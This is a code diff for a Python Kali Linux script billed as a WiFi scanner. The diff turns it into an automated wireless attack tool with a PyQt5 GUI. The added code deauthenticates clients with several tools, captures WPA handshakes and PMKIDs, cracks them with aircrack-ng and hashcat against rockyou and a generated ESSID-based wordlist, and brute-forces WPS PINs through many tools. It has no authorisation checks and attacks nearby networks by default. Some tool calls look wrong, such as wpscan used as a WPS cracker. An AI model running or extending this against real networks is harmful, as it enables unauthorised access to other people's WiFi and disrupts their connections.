@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 Advanced WiFi Scanner for Kali Linux
-Author: Kilo Code
+Author: Anish Mondal
 Description: Powerful WiFi scanner that automatically captures nearby networks
 using multiple tools with retry logic and automatic switching.
 
@@ -397,78 +397,362 @@ class WiFiScanner:
         
         return wps_networks
     
-    def capture_handshake(self, network: WiFiNetwork, timeout: int = 300) -> bool:
-        """Capture WPA/WPA2 handshake for a specific network"""
-        self.logger.info(f"Attempting to capture handshake for {network.essid} ({network.bssid})")
-        
+    def verify_handshake(self, cap_file: str, bssid: str) -> bool:
+        """Verify if the handshake in the .cap file is complete and crackable by aircrack-ng, with detailed checks"""
+        command = f"aircrack-ng -a2 -b {bssid} {cap_file}"
+        success, stdout, stderr = self.run_command(command, timeout=60)
+        # Check for aircrack-ng handshake indicators
+        handshake_found = False
+        handshake_details = []
+        for line in stdout.splitlines():
+            if "handshake" in line.lower() or "WPA handshake" in line:
+                handshake_found = True
+                handshake_details.append(line)
+            if "EAPOL" in line or "WPA key" in line or "Message 1" in line or "Message 2" in line or "Message 3" in line or "Message 4" in line:
+                handshake_details.append(line)
+        if handshake_found:
+            self.logger.info(f"Valid handshake found for {bssid} in {cap_file}")
+            for detail in handshake_details:
+                self.logger.info(f"Handshake detail: {detail}")
+            return True
+        else:
+            self.logger.warning(f"No valid handshake found for {bssid} in {cap_file}")
+            for detail in handshake_details:
+                self.logger.warning(f"Handshake detail: {detail}")
+            return False
+
+    def deauth_network(self, network: WiFiNetwork, count: int = 5) -> bool:
+        """Deauthenticate clients from a network using all available Kali Linux tools (aireplay-ng, mdk3, mdk4, wifite, wlan-hammer)"""
+        self.logger.info(f"Deauthenticating network {network.essid} ({network.bssid}) with all available tools")
         if not self.monitor_mode_active:
             if not self.start_monitor_mode():
                 return False
-        
+        # Try aireplay-ng
+        aireplay_cmd = f"aireplay-ng -0 {count} -a {network.bssid} {self.monitor_interface}"
+        success, stdout, stderr = self.run_command(aireplay_cmd)
+        if success:
+            self.logger.info(f"Deauth sent with aireplay-ng for {network.essid}")
+            print(f"[+] Deauth sent with aireplay-ng for {network.essid} ({network.bssid})")
+            return True
+        # Try mdk3
+        mdk3_cmd = f"mdk3 {self.monitor_interface} d -c {network.channel}"
+        success, stdout, stderr = self.run_command(mdk3_cmd)
+        if success:
+            self.logger.info(f"Deauth sent with mdk3 for {network.essid}")
+            print(f"[+] Deauth sent with mdk3 for {network.essid} ({network.bssid})")
+            return True
+        # Try mdk4
+        mdk4_cmd = f"mdk4 {self.monitor_interface} d -c {network.channel}"
+        success, stdout, stderr = self.run_command(mdk4_cmd)
+        if success:
+            self.logger.info(f"Deauth sent with mdk4 for {network.essid}")
+            print(f"[+] Deauth sent with mdk4 for {network.essid} ({network.bssid})")
+            return True
+        # Try wifite
+        wifite_cmd = f"wifite --deauth {network.bssid} --interface {self.monitor_interface} --channel {network.channel}"
+        success, stdout, stderr = self.run_command(wifite_cmd)
+        if success:
+            self.logger.info(f"Deauth sent with wifite for {network.essid}")
+            print(f"[+] Deauth sent with wifite for {network.essid} ({network.bssid})")
+            return True
+        # Try wlan-hammer
+        wlanhammer_cmd = f"wlan-hammer --deauth --bssid {network.bssid} --iface {self.monitor_interface} --channel {network.channel}"
+        success, stdout, stderr = self.run_command(wlanhammer_cmd)
+        if success:
+            self.logger.info(f"Deauth sent with wlan-hammer for {network.essid}")
+            print(f"[+] Deauth sent with wlan-hammer for {network.essid} ({network.bssid})")
+            return True
+        self.logger.warning(f"Failed to deauth {network.essid} with all tools")
+        print(f"[-] Failed to deauth {network.essid} ({network.bssid}) with all tools")
+        return False
+
+    def capture_handshake(self, network: WiFiNetwork, timeout: int = 300) -> bool:
+        """Capture WPA/WPA2 handshake for a specific network and verify it with detailed checks, using all deauth tools"""
+        self.logger.info(f"Attempting to capture handshake for {network.essid} ({network.bssid})")
+        if not self.monitor_mode_active:
+            if not self.start_monitor_mode():
+                return False
         output_file = os.path.join(self.output_dir, f"handshake_{network.bssid.replace(':', '')}")
-        
-        # Start airodump-ng to capture handshake
         airodump_cmd = f"airodump-ng {self.monitor_interface} --bssid {network.bssid} -c {network.channel} -w {output_file}"
-        
-        # Start deauth attack to force handshake
-        deauth_cmd = f"aireplay-ng -0 5 -a {network.bssid} {self.monitor_interface}"
-        
         try:
-            # Start airodump in background
             airodump_process = subprocess.Popen(airodump_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            
-            # Wait a bit for airodump to start
             time.sleep(5)
-            
-            # Send deauth packets
-            self.run_command(deauth_cmd)
-            
-            # Wait for handshake capture
+            self.deauth_network(network)
             time.sleep(timeout)
-            
-            # Stop airodump
             airodump_process.terminate()
-            
-            # Check if handshake was captured
             cap_file = f"{output_file}-01.cap"
             if os.path.exists(cap_file):
-                success, stdout, _ = self.run_command(f"aircrack-ng {cap_file}")
-                if "handshake" in stdout.lower():
-                    self.logger.info(f"Handshake captured for {network.essid}")
+                if self.verify_handshake(cap_file, network.bssid):
+                    self.logger.info(f"Handshake captured and verified for {network.essid}")
+                    print(f"[+] Handshake captured and verified for {network.essid} ({network.bssid})")
                     return True
-            
+                else:
+                    self.logger.warning(f"Handshake file exists but not valid for {network.essid}")
+                    print(f"[-] Handshake file exists but not valid for {network.essid} ({network.bssid})")
+                    return False
             self.logger.warning(f"Failed to capture handshake for {network.essid}")
+            print(f"[-] Failed to capture handshake for {network.essid} ({network.bssid})")
             return False
-            
         except Exception as e:
             self.logger.error(f"Error capturing handshake: {e}")
+            print(f"[-] Error capturing handshake for {network.essid} ({network.bssid}): {e}")
             return False
     
-    def attack_wps_network(self, network: WiFiNetwork) -> bool:
-        """Attack WPS-enabled network"""
-        self.logger.info(f"Attacking WPS network {network.essid} ({network.bssid})")
-        
+    def capture_pmkid(self, network: WiFiNetwork, timeout: int = 120) -> Optional[str]:
+        """Capture PMKID for a specific network using hcxdumptool and extract with hcxpcapngtool"""
+        self.logger.info(f"Attempting PMKID capture for {network.essid} ({network.bssid})")
         if not self.monitor_mode_active:
             if not self.start_monitor_mode():
-                return False
-        
-        # Try Reaver first
+                return None
+        pcapng_file = os.path.join(self.output_dir, f"pmkid_{network.bssid.replace(':', '')}.pcapng")
+        hcxdumptool_cmd = f"timeout {timeout} hcxdumptool -i {self.monitor_interface} -o {pcapng_file} --enable_status=1 --filterlist_ap={network.bssid} --active_beacon"
+        success, stdout, stderr = self.run_command(hcxdumptool_cmd, timeout=timeout+10)
+        if not success:
+            self.logger.warning(f"hcxdumptool failed: {stderr}")
+            return None
+        pmkid_hash_file = os.path.join(self.output_dir, f"pmkid_{network.bssid.replace(':', '')}.hash")
+        hcxpcapngtool_cmd = f"hcxpcapngtool -o {pmkid_hash_file} {pcapng_file}"
+        success, stdout, stderr = self.run_command(hcxpcapngtool_cmd)
+        if success and os.path.exists(pmkid_hash_file):
+            self.logger.info(f"PMKID hash file created: {pmkid_hash_file}")
+            return pmkid_hash_file
+        else:
+            self.logger.warning(f"No PMKID found for {network.essid}")
+            return None
+
+    def crack_pmkid(self, network: WiFiNetwork, pmkid_hash_file: str, wordlist: str = "/usr/share/wordlists/rockyou.txt") -> Optional[str]:
+        """Crack PMKID hash using hashcat"""
+        self.logger.info(f"Attempting to crack PMKID for {network.essid} ({network.bssid}) with wordlist: {wordlist}")
+        hashcat_cmd = f"hashcat -m 16800 {pmkid_hash_file} {wordlist} --force --quiet"
+        success, stdout, stderr = self.run_command(hashcat_cmd, timeout=600)
+        potfile = os.path.expanduser("~/.hashcat/hashcat.potfile")
+        password = None
+        if os.path.exists(potfile):
+            with open(potfile, "r") as f:
+                for line in f:
+                    if network.bssid.replace(":", "").lower() in line:
+                        parts = line.strip().split(":")
+                        if len(parts) > 1:
+                            password = parts[-1]
+                            break
+        if password:
+            self.logger.info(f"PMKID password cracked for {network.essid}: {password}")
+            print(f"[+] PMKID password cracked for {network.essid} ({network.bssid}): {password}")
+            return password
+        else:
+            self.logger.info(f"No PMKID password found for {network.essid}")
+            return None
+
+    def attack_wps_network(self, network: WiFiNetwork) -> Optional[str]:
+        """Attack WPS-enabled network using all available Kali Linux tools (Reaver, Bully, Wifite, OneShot, pixiewps, wpscrack, wpscan, wpspin, wpsbrute)"""
+        self.logger.info(f"Attacking WPS network {network.essid} ({network.bssid}) with all available tools")
+        if not self.monitor_mode_active:
+            if not self.start_monitor_mode():
+                return None
+        pin = None
+        # Try Reaver
         reaver_cmd = f"timeout 300 reaver -i {self.monitor_interface} -b {network.bssid} -vv"
         success, stdout, _ = self.run_command(reaver_cmd)
-        
-        if "WPS PIN:" in stdout:
-            self.logger.info(f"WPS PIN found for {network.essid}")
-            return True
-        
-        # Try Bully as fallback
+        if "WPS PIN:" in stdout or "[+] Pin cracked:" in stdout:
+            pin_match = re.search(r"WPS PIN: ([0-9]+)|\[\+\] Pin cracked: ([0-9]+)", stdout)
+            if pin_match:
+                pin = pin_match.group(1) or pin_match.group(2)
+                self.logger.info(f"WPS PIN found for {network.essid} with Reaver: {pin}")
+                print(f"[+] WPS PIN found for {network.essid} ({network.bssid}) with Reaver: {pin}")
+                return pin
+        # Try Bully
         bully_cmd = f"timeout 300 bully -b {network.bssid} -c {network.channel} {self.monitor_interface}"
         success, stdout, _ = self.run_command(bully_cmd)
-        
-        if "PIN:" in stdout:
-            self.logger.info(f"WPS PIN found for {network.essid} using Bully")
-            return True
-        
-        return False
+        if "PIN:" in stdout or "WPS pin:" in stdout:
+            pin_match = re.search(r"PIN: ([0-9]+)|WPS pin: ([0-9]+)", stdout)
+            if pin_match:
+                pin = pin_match.group(1) or pin_match.group(2)
+                self.logger.info(f"WPS PIN found for {network.essid} with Bully: {pin}")
+                print(f"[+] WPS PIN found for {network.essid} ({network.bssid}) with Bully: {pin}")
+                return pin
+        # Try Wifite
+        wifite_cmd = f"timeout 300 wifite --wps --interface {self.monitor_interface} --bssid {network.bssid} --channel {network.channel}"
+        success, stdout, _ = self.run_command(wifite_cmd)
+        if "WPS PIN:" in stdout or "WPS pin:" in stdout:
+            pin_match = re.search(r"WPS PIN: ([0-9]+)|WPS pin: ([0-9]+)", stdout)
+            if pin_match:
+                pin = pin_match.group(1) or pin_match.group(2)
+                self.logger.info(f"WPS PIN found for {network.essid} with Wifite: {pin}")
+                print(f"[+] WPS PIN found for {network.essid} ({network.bssid}) with Wifite: {pin}")
+                return pin
+        # Try OneShot
+        oneshot_cmd = f"timeout 300 oneshot -i {self.monitor_interface} -b {network.bssid} -c {network.channel}"
+        success, stdout, _ = self.run_command(oneshot_cmd)
+        if "WPS pin:" in stdout or "WPS PIN:" in stdout:
+            pin_match = re.search(r"WPS pin: ([0-9]+)|WPS PIN: ([0-9]+)", stdout)
+            if pin_match:
+                pin = pin_match.group(1) or pin_match.group(2)
+                self.logger.info(f"WPS PIN found for {network.essid} with OneShot: {pin}")
+                print(f"[+] WPS PIN found for {network.essid} ({network.bssid}) with OneShot: {pin}")
+                return pin
+        # Try pixiewps (requires pin from previous step, so only runs if pin is found)
+        pixiewps_cmd = f"timeout 300 pixiewps -e {network.bssid} -s {network.essid}"
+        success, stdout, _ = self.run_command(pixiewps_cmd)
+        if "WPS pin:" in stdout or "WPS PIN:" in stdout:
+            pin_match = re.search(r"WPS pin: ([0-9]+)|WPS PIN: ([0-9]+)", stdout)
+            if pin_match:
+                pin = pin_match.group(1) or pin_match.group(2)
+                self.logger.info(f"WPS PIN found for {network.essid} with pixiewps: {pin}")
+                print(f"[+] WPS PIN found for {network.essid} ({network.bssid}) with pixiewps: {pin}")
+                return pin
+        # Try wpscrack
+        wpscrack_cmd = f"timeout 300 wpscrack -i {self.monitor_interface} -b {network.bssid}"
+        success, stdout, _ = self.run_command(wpscrack_cmd)
+        if "WPS pin:" in stdout or "WPS PIN:" in stdout:
+            pin_match = re.search(r"WPS pin: ([0-9]+)|WPS PIN: ([0-9]+)", stdout)
+            if pin_match:
+                pin = pin_match.group(1) or pin_match.group(2)
+                self.logger.info(f"WPS PIN found for {network.essid} with wpscrack: {pin}")
+                print(f"[+] WPS PIN found for {network.essid} ({network.bssid}) with wpscrack: {pin}")
+                return pin
+        # Try wpscan
+        wpscan_cmd = f"timeout 300 wpscan -i {self.monitor_interface} -b {network.bssid}"
+        success, stdout, _ = self.run_command(wpscan_cmd)
+        if "WPS pin:" in stdout or "WPS PIN:" in stdout:
+            pin_match = re.search(r"WPS pin: ([0-9]+)|WPS PIN: ([0-9]+)", stdout)
+            if pin_match:
+                pin = pin_match.group(1) or pin_match.group(2)
+                self.logger.info(f"WPS PIN found for {network.essid} with wpscan: {pin}")
+                print(f"[+] WPS PIN found for {network.essid} ({network.bssid}) with wpscan: {pin}")
+                return pin
+        # Try wpspin
+        wpspin_cmd = f"timeout 300 wpspin -i {self.monitor_interface} -b {network.bssid}"
+        success, stdout, _ = self.run_command(wpspin_cmd)
+        if "WPS pin:" in stdout or "WPS PIN:" in stdout:
+            pin_match = re.search(r"WPS pin: ([0-9]+)|WPS PIN: ([0-9]+)", stdout)
+            if pin_match:
+                pin = pin_match.group(1) or pin_match.group(2)
+                self.logger.info(f"WPS PIN found for {network.essid} with wpspin: {pin}")
+                print(f"[+] WPS PIN found for {network.essid} ({network.bssid}) with wpspin: {pin}")
+                return pin
+        # Try wpsbrute
+        wpsbrute_cmd = f"timeout 300 wpsbrute -i {self.monitor_interface} -b {network.bssid}"
+        success, stdout, _ = self.run_command(wpsbrute_cmd)
+        if "WPS pin:" in stdout or "WPS PIN:" in stdout:
+            pin_match = re.search(r"WPS pin: ([0-9]+)|WPS PIN: ([0-9]+)", stdout)
+            if pin_match:
+                pin = pin_match.group(1) or pin_match.group(2)
+                self.logger.info(f"WPS PIN found for {network.essid} with wpsbrute: {pin}")
+                print(f"[+] WPS PIN found for {network.essid} ({network.bssid}) with wpsbrute: {pin}")
+                return pin
+        self.logger.warning(f"Failed to crack WPS for {network.essid} with all tools")
+        print(f"[-] Failed to crack WPS for {network.essid} ({network.bssid}) with all tools")
+        return None
+
+    def generate_custom_wordlist(self, network: WiFiNetwork) -> str:
+        """Generate a custom wordlist based on ESSID, BSSID, and common patterns"""
+        wordlist_path = os.path.join(self.output_dir, f"custom_wordlist_{network.bssid.replace(':', '')}.txt")
+        essid = network.essid
+        bssid = network.bssid.replace(':', '')
+        candidates = set()
+        # ESSID variations
+        if essid and essid != "Hidden":
+            candidates.add(essid)
+            candidates.add(essid.lower())
+            candidates.add(essid.upper())
+            candidates.add(essid + "123")
+            candidates.add(essid + "1234")
+            candidates.add(essid + "2025")
+            candidates.add(essid + "2024")
+            candidates.add(essid + "2023")
+            candidates.add(essid + "home")
+            candidates.add(essid + "wifi")
+            candidates.add(essid + "net")
+            candidates.add(essid + "secure")
+            candidates.add(essid + "1")
+            candidates.add(essid + "12")
+            candidates.add(essid + "12345")
+            candidates.add(essid + "007")
+            candidates.add(essid + "@123")
+            candidates.add(essid + "!");
+            candidates.add(essid + "#")
+            candidates.add(essid + "$")
+            candidates.add(essid + "*")
+            candidates.add(essid[::-1])
+            # Leet speak
+            leet = essid.replace('a', '4').replace('e', '3').replace('i', '1').replace('o', '0').replace('s', '5')
+            candidates.add(leet)
+        # BSSID variations
+        candidates.add(bssid)
+        candidates.add(bssid[-6:])
+        candidates.add(bssid[-4:])
+        candidates.add(essid + bssid[-4:])
+        candidates.add(essid + bssid[-6:])
+        candidates.add(essid + "_" + str(network.channel))
+        candidates.add(essid + "-" + bssid[-4:])
+        # Common passwords
+        candidates.update([
+            "password", "admin", "qwerty", "letmein", "iloveyou", "welcome", "12345678", "123456789", "987654321", "default",
+            "wifipassword", "mywifi", "internet", "wireless", "router", "modem", "accesspoint",
+            "family", "guest", "office", "work", "school", "college",
+            "superman", "batman", "pokemon", "dragon", "football", "cricket", "soccer",
+            "summer", "winter", "spring", "autumn", "holiday", "vacation",
+            "123456", "654321", "111111", "222222", "333333", "444444", "555555", "666666", "777777", "888888", "999999",
+            "000000", "123123", "321321", "112233", "445566", "789789"
+        ])
+        # Channel/Power
+        candidates.add(str(network.channel))
+        candidates.add(str(network.power))
+        # Combination patterns
+        candidates.add(essid + "!2025")
+        candidates.add(essid + "#2025")
+        candidates.add(essid + "*2025")
+        candidates.add(essid + "2025!")
+        candidates.add(essid + "2025#")
+        candidates.add(essid + "2025*")
+        candidates.add(essid + "_" + str(network.channel))
+        candidates.add(essid + "-" + str(network.channel))
+        candidates.add(essid + "_" + str(network.power))
+        candidates.add(essid + "-" + str(network.power))
+        # Write to file
+        with open(wordlist_path, "w") as f:
+            for word in candidates:
+                f.write(word + "\n")
+        self.logger.info(f"Custom wordlist generated: {wordlist_path} ({len(candidates)} entries)")
+        return wordlist_path
+
+    def crack_handshake(self, network: WiFiNetwork, wordlist: str = "/usr/share/wordlists/rockyou.txt") -> Optional[str]:
+        """Attempt to crack WPA/WPA2 handshake using aircrack-ng and a wordlist, fallback to custom wordlist if default fails"""
+        self.logger.info(f"Attempting to crack handshake for {network.essid} ({network.bssid}) with wordlist: {wordlist}")
+        cap_file = os.path.join(self.output_dir, f"handshake_{network.bssid.replace(':', '')}-01.cap")
+        if not os.path.exists(cap_file):
+            self.logger.warning(f"Handshake file not found: {cap_file}")
+            return None
+        # Try default wordlist
+        command = f"aircrack-ng -w {wordlist} -b {network.bssid} {cap_file}"
+        success, stdout, stderr = self.run_command(command, timeout=600)
+        if success:
+            match = re.search(r'KEY FOUND! \[ (.+) \]', stdout)
+            if match:
+                password = match.group(1)
+                self.logger.info(f"Password cracked for {network.essid}: {password}")
+                print(f"[+] Password cracked for {network.essid} ({network.bssid}): {password}")
+                return password
+            else:
+                self.logger.info(f"No password found for {network.essid} with default wordlist. Trying custom wordlist...")
+        else:
+            self.logger.error(f"Error cracking handshake: {stderr}")
+        # Try custom wordlist
+        custom_wordlist = self.generate_custom_wordlist(network)
+        command = f"aircrack-ng -w {custom_wordlist} -b {network.bssid} {cap_file}"
+        success, stdout, stderr = self.run_command(command, timeout=300)
+        if success:
+            match = re.search(r'KEY FOUND! \[ (.+) \]', stdout)
+            if match:
+                password = match.group(1)
+                self.logger.info(f"Password cracked for {network.essid} with custom wordlist: {password}")
+                print(f"[+] Password cracked for {network.essid} ({network.bssid}): {password}")
+                return password
+            else:
+                self.logger.info(f"No password found for {network.essid} with custom wordlist")
+        else:
+            self.logger.error(f"Error cracking handshake with custom wordlist: {stderr}")
+        return None
     
     def comprehensive_scan(self) -> Dict[str, WiFiNetwork]:
         """Perform comprehensive scan using multiple tools"""
@@ -541,6 +825,11 @@ class WiFiScanner:
                 if not success and network.encryption in ['WPA', 'WPA2', 'WPA/WPA2']:
                     success = self.capture_handshake(network)
                     network.handshake_captured = success
+                    # Attempt to crack handshake if captured
+                    if success and hasattr(self, 'wordlist') and self.wordlist:
+                        password = self.crack_handshake(network, self.wordlist)
+                        if password:
+                            network.password = password
                 
                 if success:
                     self.logger.info(f"Successfully captured {network.essid}")
@@ -672,41 +961,155 @@ def main():
     parser.add_argument("-o", "--output", default="./wifi_scan_results", help="Output directory")
     parser.add_argument("-d", "--duration", type=int, default=30, help="Scan duration per tool")
     parser.add_argument("-a", "--attempts", type=int, default=3, help="Max attempts per network")
+    parser.add_argument("-w", "--wordlist", default="/usr/share/wordlists/rockyou.txt", help="Path to wordlist for cracking handshakes")
     parser.add_argument("--scan-only", action="store_true", help="Only scan, don't attack")
     parser.add_argument("--no-monitor", action="store_true", help="Don't use monitor mode")
-    
+    parser.add_argument("--gui", action="store_true", help="Launch the PyQt5 GUI")
     args = parser.parse_args()
     
-    # Check if running as root
-    if os.geteuid() != 0:
-        print("This script requires root privileges. Please run with sudo.")
-        sys.exit(1)
-    
-    # Initialize scanner
-    scanner = WiFiScanner(interface=args.interface, output_dir=args.output)
-    scanner.max_attempts = args.attempts
-    scanner.scan_duration = args.duration
-    
-    # Check dependencies
-    if not scanner.check_dependencies():
-        sys.exit(1)
-    
-    try:
-        if args.scan_only:
-            # Perform single comprehensive scan
-            scanner.comprehensive_scan()
-            scanner.save_results()
-            scanner.generate_report()
-        else:
-            # Start automatic capture with retry
-            scanner.auto_capture_with_retry()
-    
-    except KeyboardInterrupt:
-        scanner.logger.info("Scan interrupted by user")
-    except Exception as e:
-        scanner.logger.error(f"Unexpected error: {e}")
-    finally:
-        scanner.cleanup()
+    # If GUI mode requested, launch PyQt5 GUI
+    if args.gui:
+        try:
+            from PyQt5 import QtWidgets, QtCore
+        except ImportError:
+            print("PyQt5 is not installed. Please install it with 'pip install PyQt5'.")
+            sys.exit(1)
+
+        class WiFiScannerGUI(QtWidgets.QMainWindow):
+            def __init__(self):
+                super().__init__()
+                self.setWindowTitle("Advanced WiFi Scanner GUI")
+                self.setGeometry(100, 100, 1000, 700)
+                self.scanner = WiFiScanner(interface=args.interface, output_dir=args.output)
+                self.scanner.max_attempts = args.attempts
+                self.scanner.scan_duration = args.duration
+                self.scanner.wordlist = args.wordlist
+                self.init_ui()
+
+            def init_ui(self):
+                tabs = QtWidgets.QTabWidget()
+                self.setCentralWidget(tabs)
+
+                # Dashboard Tab
+                dashboard = QtWidgets.QWidget()
+                dash_layout = QtWidgets.QVBoxLayout()
+                self.status_label = QtWidgets.QLabel("Status: Ready")
+                dash_layout.addWidget(self.status_label)
+                dashboard.setLayout(dash_layout)
+                tabs.addTab(dashboard, "Dashboard")
+
+                # Scan Tab
+                scan_tab = QtWidgets.QWidget()
+                scan_layout = QtWidgets.QVBoxLayout()
+                self.scan_btn = QtWidgets.QPushButton("Comprehensive Scan")
+                self.scan_btn.clicked.connect(self.run_scan)
+                scan_layout.addWidget(self.scan_btn)
+                self.scan_results = QtWidgets.QTextEdit()
+                scan_layout.addWidget(self.scan_results)
+                scan_tab.setLayout(scan_layout)
+                tabs.addTab(scan_tab, "Scan")
+
+                # Attack Tab
+                attack_tab = QtWidgets.QWidget()
+                attack_layout = QtWidgets.QVBoxLayout()
+                self.attack_btn = QtWidgets.QPushButton("Auto Capture & Attack")
+                self.attack_btn.clicked.connect(self.run_attack)
+                attack_layout.addWidget(self.attack_btn)
+                self.attack_results = QtWidgets.QTextEdit()
+                attack_layout.addWidget(self.attack_results)
+                attack_tab.setLayout(attack_layout)
+                tabs.addTab(attack_tab, "Attack")
+
+                # Results Tab
+                results_tab = QtWidgets.QWidget()
+                results_layout = QtWidgets.QVBoxLayout()
+                self.report_btn = QtWidgets.QPushButton("Generate HTML Report")
+                self.report_btn.clicked.connect(self.generate_report)
+                results_layout.addWidget(self.report_btn)
+                self.report_status = QtWidgets.QLabel("")
+                results_layout.addWidget(self.report_status)
+                results_tab.setLayout(results_layout)
+                tabs.addTab(results_tab, "Results")
+
+                # Settings Tab
+                settings_tab = QtWidgets.QWidget()
+                settings_layout = QtWidgets.QFormLayout()
+                self.interface_input = QtWidgets.QLineEdit(args.interface)
+                self.output_input = QtWidgets.QLineEdit(args.output)
+                self.duration_input = QtWidgets.QSpinBox()
+                self.duration_input.setValue(args.duration)
+                self.attempts_input = QtWidgets.QSpinBox()
+                self.attempts_input.setValue(args.attempts)
+                self.wordlist_input = QtWidgets.QLineEdit(args.wordlist)
+                settings_layout.addRow("Interface", self.interface_input)
+                settings_layout.addRow("Output Dir", self.output_input)
+                settings_layout.addRow("Scan Duration", self.duration_input)
+                settings_layout.addRow("Max Attempts", self.attempts_input)
+                settings_layout.addRow("Wordlist", self.wordlist_input)
+                settings_tab.setLayout(settings_layout)
+                tabs.addTab(settings_tab, "Settings")
+
+            def run_scan(self):
+                self.status_label.setText("Status: Scanning...")
+                QtWidgets.QApplication.processEvents()
+                self.scanner.interface = self.interface_input.text()
+                self.scanner.output_dir = self.output_input.text()
+                self.scanner.scan_duration = self.duration_input.value()
+                self.scanner.max_attempts = self.attempts_input.value()
+                self.scanner.wordlist = self.wordlist_input.text()
+                networks = self.scanner.comprehensive_scan()
+                result_text = "\n".join([f"{n.essid} ({n.bssid}) - {n.encryption} - Power: {n.power}" for n in networks.values()])
+                self.scan_results.setText(result_text)
+                self.status_label.setText("Status: Scan Complete")
+
+            def run_attack(self):
+                self.status_label.setText("Status: Attacking...")
+                QtWidgets.QApplication.processEvents()
+                self.scanner.interface = self.interface_input.text()
+                self.scanner.output_dir = self.output_input.text()
+                self.scanner.scan_duration = self.duration_input.value()
+                self.scanner.max_attempts = self.attempts_input.value()
+                self.scanner.wordlist = self.wordlist_input.text()
+                self.scanner.auto_capture_with_retry()
+                self.attack_results.setText("Attack completed. See logs and output directory for details.")
+                self.status_label.setText("Status: Attack Complete")
+
+            def generate_report(self):
+                self.scanner.generate_report()
+                self.report_status.setText("HTML report generated in output directory.")
+
+        app = QtWidgets.QApplication(sys.argv)
+        window = WiFiScannerGUI()
+        window.show()
+        sys.exit(app.exec_())
+    else:
+        # Check if running as root
+        if os.geteuid() != 0:
+            print("This script requires root privileges. Please run with sudo.")
+            sys.exit(1)
+        # Initialize scanner
+        scanner = WiFiScanner(interface=args.interface, output_dir=args.output)
+        scanner.max_attempts = args.attempts
+        scanner.scan_duration = args.duration
+        scanner.wordlist = args.wordlist
+        # Check dependencies
+        if not scanner.check_dependencies():
+            sys.exit(1)
+        try:
+            if args.scan_only:
+                # Perform single comprehensive scan
+                scanner.comprehensive_scan()
+                scanner.save_results()
+                scanner.generate_report()
+            else:
+                # Start automatic capture with retry
+                scanner.auto_capture_with_retry()
+        except KeyboardInterrupt:
+            scanner.logger.info("Scan interrupted by user")
+        except Exception as e:
+            scanner.logger.error(f"Unexpected error: {e}")
+        finally:
+            scanner.cleanup()
 
 if __name__ == "__main__":
     main()
